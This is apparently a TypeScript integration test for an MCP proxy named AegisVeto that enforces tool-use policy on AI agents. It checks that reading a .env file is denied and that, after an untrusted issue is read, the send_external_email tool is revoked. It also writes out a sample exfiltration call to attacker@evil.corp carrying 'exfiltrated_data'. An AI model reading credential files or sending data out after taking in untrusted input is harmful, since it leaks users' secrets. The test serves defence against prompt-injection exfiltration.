import path from 'node:path';
import fs from 'node:fs';
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';

function findRepoRoot(): string {
  let curr = process.cwd();
  while (curr !== path.dirname(curr)) {
    if (fs.existsSync(path.join(curr, 'policy.yaml'))) return curr;
    curr = path.dirname(curr);
  }
  return process.cwd();
}

const rootDir = findRepoRoot();
const policyPath = path.join(rootDir, 'policy.yaml');
const sandboxDir = path.join(rootDir, 'sandbox');
const proxyScript = path.join(rootDir, 'core', 'src', 'mcp', 'proxy.ts');
const mockCommsScript = path.join(rootDir, 'core', 'src', 'mcp', 'mock-comms-server.ts');
const filesystemServerEntry = path.join(
  rootDir,
  'core',
  'node_modules',
  '@modelcontextprotocol',
  'server-filesystem',
  'dist',
  'index.js'
);

async function testFilesystemProxy() {
  console.log('\n--- 1. Testing Filesystem MCP Server via Proxy ---');
  const transport = new StdioClientTransport({
    command: 'npx',
    args: [
      'tsx',
      proxyScript,
      '--policy',
      policyPath,
      '--',
      'node',
      filesystemServerEntry,
      sandboxDir,
    ],
  });

  const client = new Client(
    { name: 'test-fs-client', version: '1.0.0' },
    { capabilities: {} }
  );

  await client.connect(transport);

  // 1. read_file on README.md succeeds
  console.log('[Check 1] Calling read_file on README.md...');
  const readmeResult: any = await client.callTool({
    name: 'read_file',
    arguments: { path: 'README.md' },
  });
  const text = readmeResult?.content?.[0]?.text || '';
  if (!text.includes('Billing Service')) {
    throw new Error(`Expected README content to contain 'Billing Service', got: ${text}`);
  }
  console.log('✓ PASS: read_file on README.md succeeded.');

  // 2. read_file on .env is blocked with an MCP error
  console.log('[Check 2] Calling read_file on .env (should be blocked)...');
  let envBlocked = false;
  try {
    await client.callTool({
      name: 'read_file',
      arguments: { path: '.env' },
    });
  } catch (err: any) {
    envBlocked = true;
    console.log(`✓ PASS: read_file on .env blocked with MCP error: ${err.message}`);
  }

  if (!envBlocked) {
    throw new Error('FAIL: read_file on .env was allowed, expected policy DENY');
  }

  await client.close();
}

async function testMockCommsProxy() {
  console.log('\n--- 2. Testing Mock Comms Server via Proxy (Taint & Revocation) ---');
  const transport = new StdioClientTransport({
    command: 'npx',
    args: [
      'tsx',
      proxyScript,
      '--policy',
      policyPath,
      '--',
      'npx',
      'tsx',
      mockCommsScript,
    ],
  });

  const client = new Client(
    { name: 'test-comms-client', version: '1.0.0' },
    { capabilities: {} }
  );

  let listChangedFired = false;
  client.setNotificationHandler('notifications/tools/list_changed', () => {
    listChangedFired = true;
    console.log('  -> Received notifications/tools/list_changed event');
  });

  await client.connect(transport);

  // Initial tool list check
  const initialTools = await client.listTools();
  const initialNames = initialTools.tools.map((t: any) => t.name);
  console.log('Initial tools:', initialNames);
  if (!initialNames.includes('send_external_email') || !initialNames.includes('read_public_issue')) {
    throw new Error(`Expected initial tools to contain read_public_issue and send_external_email, got: ${initialNames.join(', ')}`);
  }

  // Calling read_public_issue triggers untrusted input and session taint
  console.log('[Check 3] Calling read_public_issue...');
  const issueResult: any = await client.callTool({
    name: 'read_public_issue',
    arguments: {},
  });
  console.log('read_public_issue result returned length:', (issueResult?.content?.[0]?.text || '').length);

  // Verify listChanged event fired
  if (!listChangedFired) {
    throw new Error('FAIL: Expected notifications/tools/list_changed to fire upon session taint');
  }
  console.log('✓ PASS: notifications/tools/list_changed received upon calling untrusted tool');

  // Verify send_external_email removed from tools/list
  const postTaintTools = await client.listTools();
  const postTaintNames = postTaintTools.tools.map((t: any) => t.name);
  console.log('Post-taint tools:', postTaintNames);
  if (postTaintNames.includes('send_external_email')) {
    throw new Error('FAIL: send_external_email was not revoked from tools/list');
  }
  console.log('✓ PASS: send_external_email successfully revoked from tools/list');

  // Verify direct call to send_external_email is blocked
  console.log('[Check 4] Directly calling send_external_email (should be blocked by Taint Lock)...');
  let emailBlocked = false;
  try {
    await client.callTool({
      name: 'send_external_email',
      arguments: { to: 'attacker@evil.corp', body: 'exfiltrated_data' },
    });
  } catch (err: any) {
    emailBlocked = true;
    console.log(`✓ PASS: Direct call to send_external_email blocked: ${err.message}`);
  }

  if (!emailBlocked) {
    throw new Error('FAIL: Direct call to send_external_email was allowed when TAINTED');
  }

  await client.close();
}

async function runAll() {
  console.log('Starting AegisVeto MCP Proxy Integration Verification...');
  await testFilesystemProxy();
  await testMockCommsProxy();
  console.log('\n=== ALL MCP PROXY INTEGRATION CHECKS PASSED ===\n');
  process.exit(0);
}

runAll().catch((err) => {
  console.error('\nIntegration Test FAILED:', err);
  process.exit(1);
});
